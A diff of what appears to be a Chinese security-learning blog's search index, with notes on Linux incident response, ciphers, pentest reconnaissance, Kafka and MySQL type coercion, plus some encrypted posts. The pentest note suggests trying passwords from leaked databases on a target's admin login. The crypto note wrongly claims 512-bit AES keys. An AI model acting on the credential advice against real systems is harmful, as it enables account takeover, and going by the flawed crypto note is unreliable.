+<td>显示用户错误的登录列表</td>
+</tr>
+<tr>
+<td>who</td>
+<td>显示的是当前登录的用户</td>
+</tr>
+<tr>
+<td>w</td>
+<td>比who显示多一些内容，比如用户当前执行的命令，cpu信息</td>
+</tr>
+<tr>
+<td>history</td>
+<td>查看历史命令记录</td>
+</tr>
+</tbody>
+</table>
+<h3 id="2-1-2-检查步骤"><a class="header-anchor" href="#2-1-2-检查步骤"></a>2.1.2 检查步骤</h3>
+<ul>
+<li>
+<p>检查账号及登录情况</p>
+<p>见这篇文章：<a href="https://dawnyh99.github.io/2021/03/07/%E8%BF%90%E7%BB%B4/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/">Linux系统加固</a></p>
+</li>
+<li>
+<p>检查历史命令</p>
+</li>
+</ul>
+<pre><code class="language-bash">cat ~/bash_history &gt;&gt; history.txt
 </code></pre>
-<p>再安装<code>hexo-renderer-markdown-it</code> ：</p>
-<pre><code>npm i hexo-renderer-markdown-it -S
+<ul>
+<li>检查网络连接/开放端口</li>
+</ul>
+<pre><code class="language-bash">netstat -antlp | more
+
+#查看 PID 所对应的进程文件路径
+file /proc/$PID/exe
 </code></pre>
-<p>完成之后安装所需的插件：</p>
-<pre><code>npm i markdown-it-emoji -S
+<ul>
+<li>检查异常进程</li>
+</ul>
+<pre><code class="language-bash">ps aux | grep pid
 </code></pre>
-<p>最后打开根目录下的<code>_config.yml</code>文件，添加以下配置：</p>
-<pre><code>markdown:
-  render:
-    html: true # 在 markdown 文本中支持 html tag 标签
-    xhtmlOut: false # 需要 xtml 文档，使用 &lt;br /&gt; 替代 &lt;br&gt;
-    breaks: true # 用 &lt;br&gt; 开始新的一行
-    linkify: true # 自动将 可能是链接的内容转换成链接
-    typographer: true # 印刷标识转换
-  plugins:
-    - markdown-it-emoji # emoji表情插件
-    - markdown-it-abbr # 可选
-    - markdown-it-footnote # 可选
-    - markdown-it-ins # 可选，
-    - markdown-it-sub # 可选，下标，如H2O
-    - markdown-it-sup # 可选，上标，如2^10
-  anchors:
-    level: 2
-    collisionSuffix: ''
-    permalink: false,
-    permalinkClass: 'header-anchor'
-    permalinkSymbol: ''
-    case: 0
-    separator: ''
+<p><img src="/2021/03/08/%E5%AE%89%E5%85%A8%E7%BA%A2%E5%86%9B/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&Linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/image-20210313142418258.png" alt="image-20210313142418258"></p>
+<ul>
+<li>检查开机启动项</li>
+</ul>
+<pre><code class="language-bash">ls /etc/init.d/
+
+ls -l /etc/rc3.d/
+ls -l /etc/rc5.d/
 </code></pre>
-<p>然后保存退出，再重新加载一下hexo即可。</p>
-<pre><code>hexo clean
-hexo generate
-hexo server
+<ul>
+<li>检查定时任务</li>
+</ul>
+<pre><code class="language-bash">ls -al /var/spool/cron/* 
+cat /etc/crontab
+/etc/cron.d/*
+/etc/cron.daily/* 
+/etc/cron.hourly/* 
+/etc/cron.monthly/*
+/etc/cron.weekly/
+
+#查看目录下所有文件
+more /etc/cron.d/*
+
+/etc/anacrontab
+/var/spool/anacron/*
 </code></pre>
-<p>参考来源： <a href="https://zucchiniy.cn/archives/953e2b.html">ZucchinY的博客</a></p>
+<ul>
+<li>检查服务</li>
+</ul>
+<pre><code class="language-bash">#CentOS
+chkconfig  --list  #查看服务自启动状态，可以看到所有的RPM包安装的服务
+#Debian
+service --status-all
+systemctl list-units
+#源码包安装的服务位置
+/usr/local/
+</code></pre>
+<ul>
+<li>
+<p>检查异常文件</p>
+<ul>
+<li>查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“…”为名的文件夹具有隐藏属性</li>
+<li>针对可疑文件可以使用<code>stat</code>查看创建修改时间</li>
+<li>发现WebShell、远控木马的创建时间</li>
+</ul>
+<p>找出同一时间范围内创建的文件？</p>
+</li>
+</ul>
+<pre><code class="language-bash">find ./ -iname &quot;*&quot; -atime 1 -type f 
+#找出 ./ 下一天前访问过的文件
+</code></pre>
+<ul>
+<li>检查日志文件</li>
+</ul>
+<p>日志默认存放位置：/var/log/</p>
+<p>查看日志配置情况：more /etc/rsyslog.conf</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">日志文件</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">/var/log/cron</td>
+<td style="text-align:center">记录系统定时任务相关的日志</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/message</td>
+<td style="text-align:center">记录Linux操作系统常见的系统和服务错误信息(首要检查对象)</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/syslog</td>
+<td style="text-align:center">只记录警告信息，常常是系统出问题的信息</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/btmp</td>
+<td style="text-align:center">记录<strong>错误登录（登陆失败）<strong>日志；使用</strong>lastb</strong>命令查看</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>/var/log/lastlog</strong></td>
+<td style="text-align:center">记录系统中所有用户最后一次成功登录时间，使用<strong>lastlog</strong>命令查看</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>/var/log/wtmp</strong></td>
+<td style="text-align:center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件；用<strong>last</strong>命令来查看</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>/var/log/utmp</strong></td>
+<td style="text-align:center">只记录<strong>当前登录用户</strong>的信息；使用<strong>w,who,users</strong>等命令来查询</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/secure</td>
+<td style="text-align:center">记录验证和授权方面的信息，如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/apache2/error.log</td>
+<td style="text-align:center">apache错误日志，如果安装有modsecurity那么其攻击拦截日志也存在这里</td>
+</tr>
+</tbody>
+</table>
 ]]></content>
       <categories>
-        <category>工具</category>
-        <category>Markdown</category>
+        <category>安全红军</category>
       </categories>
       <tags>
-        <tag>Markdown</tag>
+        <tag>应急响应</tag>
       </tags>
   </entry>
   <entry>
-    <title>正则表达式笔记</title>
-    <url>/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="简介"><a class="header-anchor" href="#简介"></a>简介</h2>
-<blockquote>
-<p>正则表达式是描述一组字符串特征的模式，用来匹配特定的字符串。 ——Ken Thompson</p>
-</blockquote>
-<p>一个正则表达式是一串特殊的字符串，它可以用于匹配一组字符串。比如</p>
-<pre><code>\d
-</code></pre>
-<p>就是一个简单的正则表达式，它可以用来匹配0~9范围内的任意<strong>一个数字</strong>。</p>
-<pre><code>^(\(\d{3}\)|^\d{3}[.-]?)?\d{3}[.-]?\d{4}$
-</code></pre>
-<p>而上面这个式子也是一个正则表达式，只不过复杂了一些，它可以匹配10位的北美电话号码。无论区号是否加括号，数字间是否有句点或连字符，它都可以匹配。</p>
-<p><strong>学习时用到的工具</strong>：</p>
-<p><a href="https://regex101.com/">Regexpal网站</a>：可以在线测试正则表达式</p>
-<p>…</p>
-<h2 id="基础"><a class="header-anchor" href="#基础"></a>基础</h2>
-<h3 id="字符的匹配"><a class="header-anchor" href="#字符的匹配"></a>字符的匹配</h3>
-<h4 id="字面值匹配"><a class="header-anchor" href="#字面值匹配"></a>字面值匹配</h4>
-<p>最简单的一种，比如一个数字字符串<code>666</code>，可以在目标文本中匹配所有的<code>666</code></p>
-<p><img src="/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/fN1TQqSlujEPBCy.png" alt></p>
-<h4 id="字符组匹配"><a class="header-anchor" href="#字符组匹配"></a>字符组匹配</h4>
-<p>正则表达式将方括号<code>[]</code>视为特殊的元字符，因此方括号本身不参与匹配，而对括号内容进行匹配。</p>
-<p><code>[0-9]</code>这个正则表达式将会匹配0到9范围内的任意数字。要匹配任意3位数字可以用如下正则表达式</p>
-<pre><code>[0-9][0-9][0-9]
-</code></pre>
-<h4 id="字符组简写式（元字符）"><a class="header-anchor" href="#字符组简写式（元字符）"></a>字符组简写式（元字符）</h4>
-<p>例如：<code>[0-9]</code>可以简写为<code>\d</code>，它们都能匹配0到9之间的任意一个数字。</p>
-<p>空白字符：</p>
-<p><code>\f</code>：换页符</p>
-<p><code>\n</code>：换行符</p>
-<p><code>\r</code>：回车符</p>
-<p><code>\t</code>：制表符（Tab的缩进）</p>
-<p><code>\v</code>：垂直制表符</p>
-<p><code>\s</code>：任意一个空白字符，等价于 [\f\n\r\t\v]</p>
-<p><code>\S</code>：对<code>\s</code>取非，即任意非空字符</p>
-<p>数字元字符：</p>
-<p><code>\d</code>：匹配任意阿拉伯数字</p>
-<p><code>\D</code>：匹配任意非数字字符（如连字符<code>-</code>)</p>
-<p>字母数字元字符：</p>
-<p><code>\w</code>：大小写字母，下划线和数字，等价于[a-zA-Z0-9]</p>
-<p><code>\W</code>：对<code>\w</code>取非</p>
-<h4 id="任意字符的匹配"><a class="header-anchor" href="#任意字符的匹配"></a>任意字符的匹配</h4>
-<p><code>.</code>：点号（英文句号）可以匹配任意字符（但一般不匹配换行符）。</p>
-<p><code>.</code>是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上<code> \</code> 。</p>
-<h3 id="捕获分组和后向引用"><a class="header-anchor" href="#捕获分组和后向引用"></a>捕获分组和后向引用</h3>
-<p>将<code>\d</code>放到<code>()</code>中，则<code>\d</code>匹配到一个数字的同时该数字被捕获。捕获之后则可以被后向引用。</p>
-<p><code>\1</code>后向引用被捕获的字符。</p>
-<p>例如：正则表达式 <code>(\d)\d\1</code>  可以匹配 <code>101</code> 或者 <code>212</code> , <code>383</code> 等等,但无法匹配 <code>102</code> 。因为<code>\1</code>引用的是那个被捕获的字符，所以这个正则表达式匹配到的一定是某三个相连数字，其中第一个数字和第三个数字一定是相同的。</p>
-<h3 id="量词"><a class="header-anchor" href="#量词"></a>量词</h3>
-<p><code>\d{3}</code>匹配三个相连数字，这里<code>{3}</code>就是一个量词，花括号中可以有多个数字（用逗号<code>,</code>隔开）比如<code>{3,4}</code>表示3个或者4个；</p>
-<p><code>\d-?</code>匹配一个数字，如果该数字之后跟着一个连字符那么连字符也会被匹配到。这里的<code>?</code>也是一个量词，表示0个或1个；</p>
-<p>同理，其他常用的量词还有</p>
-<p><code>+</code>：表示1个或者多个</p>
-<p><code>*</code>：表示0个或者多个</p>
-<h3 id="括选文字符"><a class="header-anchor" href="#括选文字符"></a>括选文字符</h3>
-<p>现在可以看看下面这个比较健壮的表达式了，就是简介中的那个，它匹配10位的北美电话号码</p>
-<pre><code>^(\(\d{3}\)|^\d{3}[.-]?)?\d{3}[.-]?\d{4}$
-</code></pre>
-<p><code>^</code>匹配行起始位置，即<code>^</code>后面跟着的内容<code>(\(\d{3}\)|^\d{3}[.-]?)</code>必须出现在行首；</p>
-<p><code>\(</code>和<code>\)</code>就是将左右括号转义，让它表示其字面意思，而不是捕获分组的开始结束标志；</p>
-<p><code>|</code>表示或运算，即匹配<code>|</code>两边的内容之一；</p>
-<p><code>[.-]</code>匹配一个可选的点号（这里点号不再匹配任意字符）或连字符；</p>
-<p><code>$</code>匹配行的结束标志</p>
-<p>这个表达式最终匹配十位的北美电话号码，而且括号、连字符或者点号都是可选的。你可以试试不同格式的电话号码，看看它能否匹配。以上正则表达式中的捕获分组并不是必需的。分组是必要的，但是捕获不需要。更好的方法是使用非捕获分组。</p>
-<h2 id="模式匹配"><a class="header-anchor" href="#模式匹配"></a>模式匹配</h2>
-<p>留坑待填</p>
+    <title>密码算法</title>
+    <url>/2021/08/09/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="对称加密"><a class="header-anchor" href="#对称加密"></a>对称加密</h2>
+<ul>
+<li>DES（Data Encryption Standard）：数据加密标准，速度较快，适用于加密大量数据的场合；</li>
+<li>3DES（Triple DES）：是基于DES，对一块数据用三个不同的密钥进行三次加密，强度更高；</li>
+<li>AES（Advanced Encryption Standard）：高级加密标准，是下一代的加密算法标准，速度快，安全级别高，支持128、192、256、512位密钥的加密；</li>
+<li>RC2：分组加密，输入输出均为64位</li>
+<li>RC4：流密码</li>
+<li>Blowfish：区块加密算法</li>
+</ul>
+<h2 id="非对称加密"><a class="header-anchor" href="#非对称加密"></a>非对称加密</h2>
+<ul>
+<li>
+<p>RSA：基于大数分解难题</p>
+<ul>
+<li>随意选择两个大的质数p和q，p不等于q，计算N = pq.</li>
+<li>根据欧拉函数，求得r=φ(N)=φ§φ(q)=(p-1)(q-1)。</li>
+<li>选择一个小于r的整数e,是e与r互质。并求得e关于r的模反元素，命名为d。(求d令ed≡1(mod r))。(模反元素存在，当且仅当e与r互质）</li>
+<li>将p和q的记录销毁。</li>
+</ul>
+<p>其中(N，e)是公钥，(N，d)是私钥。</p>
+<p>参考：<a href="https://blog.csdn.net/gao131360144/article/details/79966094">https://blog.csdn.net/gao131360144/article/details/79966094</a></p>
+</li>
+<li>
+<p>DSA：基于整数有限域离散对数难题</p>
+</li>
+<li>
+<p>ECC：椭圆曲线</p>
+</li>
+</ul>
 ]]></content>
       <categories>
-        <category>工具</category>
-        <category>正则表达式</category>
+        <category>基础知识</category>
       </categories>
       <tags>
-        <tag>正则表达式</tag>
+        <tag>密码算法</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>已安装程序（服务）的运行方式</title>
-    <url>/2022/11/03/%E6%9D%82%E8%AE%B0/%E5%B7%B2%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F%EF%BC%88%E6%9C%8D%E5%8A%A1%EF%BC%89%E7%9A%84%E8%BF%90%E8%A1%8C%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
-      <categories>
-        <category>杂记</category>
-      </categories>
   </entry>
   <entry>
     <title>渗透测试基础</title>
-    <url>/2021/03/04/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
+    <url>/2021/03/04/%E5%AE%89%E5%85%A8%E8%93%9D%E5%86%9B/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h2 id="渗透思路-流程"><a class="header-anchor" href="#渗透思路-流程"></a>渗透思路/流程</h2>
 <p><strong>信息收集</strong></p>
 <p>a、获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。</p>
@@ -668,7 +1316,177 @@ hexo server
 <h2 id="指纹搜集"><a class="header-anchor" href="#指纹搜集"></a>指纹搜集</h2>
 ]]></content>
       <categories>
-        <category>渗透</category>
+        <category>安全蓝军</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kafka笔记</title>
+    <url>/2021/07/23/%E5%B7%A5%E5%85%B7/kafka/</url>
+    <content><![CDATA[<h2 id="消息队列模型"><a class="header-anchor" href="#消息队列模型"></a>消息队列模型</h2>
+<p>队列模型：最早的模型，消息先进先出，一条消息只能被一个消费者使用</p>
+<p><strong>发布-订阅模型</strong>：kafka使用的模型</p>
+<p><img src="/2021/07/23/%E5%B7%A5%E5%85%B7/kafka/image-20210714161917846.png" alt="image-20210714161917846"></p>
+<h2 id="基本概念"><a class="header-anchor" href="#基本概念"></a>基本概念</h2>
+<p><strong>生产者（Producer）</strong>——产生消息的一方</p>
+<p><strong>消费者（Consumer）</strong>——处理消息的一方</p>
+<p><strong>代理（Broker）</strong>——可以看作是一个独立的 Kafka 实例。多个 Kafka Broker 组成一个 Kafka Cluster（集群）</p>
+<p><strong>Topic（主题）</strong> : Producer 将消息发送到特定的主题，Consumer 通过订阅特定的 Topic(主题) 来消费消息。</p>
+<p><strong>Partition（分区）</strong> : Partition 属于 Topic 的一部分。一个 Topic 可以有多个 Partition ，并且同一 Topic 下的 Partition 可以分布在不同的 Broker 上，这也就表明一个 Topic 可以横跨多个 Broker 。</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>kafka</tag>
+        <tag>消息队列</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mysql的自动类型转换</title>
+    <url>/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</url>
+    <content><![CDATA[<h2 id="一个小特性"><a class="header-anchor" href="#一个小特性"></a>一个小特性</h2>
+<p>在查询语句的条件判断子句中，如果等号左右两边的类型不同，则会自动进行类型转换。以如下数据表为例</p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722084058433.png" alt="image-20200722084058433"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722082629984.png" alt="image-20200722082629984"></p>
+<p><code>DVWA</code>的<code>user</code>表👆</p>
+<p>在进行以下查询时结果如图：</p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722082807883.png" alt="image-20200722082807883"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722082829117.png" alt="image-20200722082829117"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722084904218.png" alt="image-20200722084904218"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722084727031.png" alt="image-20200722084727031"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722083932481.png" alt="image-20200722083932481"></p>
+<p>通过上面几个查询的例子可以看到，mysql查询语句的条件判断中，像user_id = ‘xxx’ 这种条件，user_id 是整型，而 ‘xxx’ 是字符串型，在判断时，'xxx’会被当作一个整型与 user_id进行比较。</p>
+<p>而转换的规则也很有意思。</p>
+<p>‘1 and 1=1’ 被当作 1</p>
+<p>‘1 and 1=2’ 也被当作1</p>
+<p>‘2 and 1=1’ 被当作2</p>
+<p>经过更多的测试可以发现</p>
+<p>这个字符串（不论是单引号或者是双引号）在被当作整型数进行处理的时候</p>
+<p>如果第一个字符不是数字，那么该字符串被当成<code>0</code>来处理；</p>
+<p>如果第一个字符是数字，那么这个字符串就等于从第一个字符开始的数字串</p>
+<p>比如：‘4gsb’ = 4；‘108hh’ = 108</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>mysql</tag>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>已安装程序（服务）的运行方式</title>
+    <url>/2022/11/03/%E6%9D%82%E8%AE%B0/%E5%B7%B2%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F%EF%BC%88%E6%9C%8D%E5%8A%A1%EF%BC%89%E7%9A%84%E8%BF%90%E8%A1%8C%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19sHej7mfQUYrbAeqmZoLinoWKLUTm/PPznRsJKuPOXgzk6Ss85wwx7ABhe+9YliGFOC1Rd9AeBvMiIr7Qh487sWf3CBwPzrarGLeaKzT3ihhLyyzegI7jww+24N3f0HLHjuvNa4RkcxBru8OJRQwY/xMYRHXzFv/Vj34jU29N2IYdt6VuSA1uEaQzQprYDo+8m3MLJ3+oQOZHZAF/7xPRqIKqoyXssvM5Wi8cIbv9ZUx7TpGupLJrLMNJ6mtEOB80EY4WvGZRdBLBhK0cYSRz2eTu8rFtct4JSnKUvJ8O7phJZhf6+Jh6UMF/zMBbZ5S/cUHI4MfftE8dzW2e/erN85f4Aq6mhHd4Ntz0Q8438z+IIzhxf9mNxRV0NKtB+Dj8p3lsmtkUr9FEHv6SJN7qJHhFTDIyQC4EnyZCke8ylK+/AxdlGwhortLRzHz/u46WiHbr/4BM4rS8BPFWQtOzX+flVxsbkV0I8HPdg3mZ05Q6UkiN3EreDJOLVcGc4vlRiZl1M4R6G3l69wLjpBDADh074A3eJA9cPQZDRZuXDTzunSbNIJpW4aSCeqLLpOC+GlxMuPUPLom49mjkmhusAd9UQOBEXgshluL51zL0ox6inY4PsEU03Iuh6y91MEzaurBk8uKuIPngWhX5lA3bt1nMmvw630pCvk2wpCIJBo2SY0cs9TvFwmdueZR1u3lsaxgAlDcIKtyZSGeJw0VVTyKVwm4I8MUfSKK99FIppV2iDa0yyJDT7TIHUxCVZ2/TibyuN+9wkuNBtAOfuHgME+9PtUuzmWCjDMDJuRGNHJ7foBxIcvWEVlaNNv64jG5A75QEWXcBBL73shp4/V9hx3JBHPa3QLmqrul6MdbEKCPM2LfveIaf0sqgaP+BVJSTwRwxgWei3Dgg8XG1WUyEZcFCcXHv+AnPAlc3ABYh9Rtbb6YPEIh1v2Kv9Mv2HAI+9TlK28F+MyUh0TWoek338nqOR/6tRP8GdSiS4/vv2UZB/M2cSlx06Xjf+SYKtMHpxaoopsqlqKBQHGg/v9t9VF4pbX3PzLd/Q+oLsgR1Fk59WnjwhsqYAhBVqFoQcpJxiLeW3CpBu3iYGp8o2OcpBgj/U+owRtvRiqF86pJxf+XCpRK/rxBZOUxYTWlrSfTSyxQ80oaFgmYZ5I87oHb2i1NhDXjR2cv6G6N5LsqO+MiWImysQ631oIjn02AW2VNVlOteE2xReZHMxtiP04O4mmarMJLq6/QQjD7GdFrnK6NyQxawD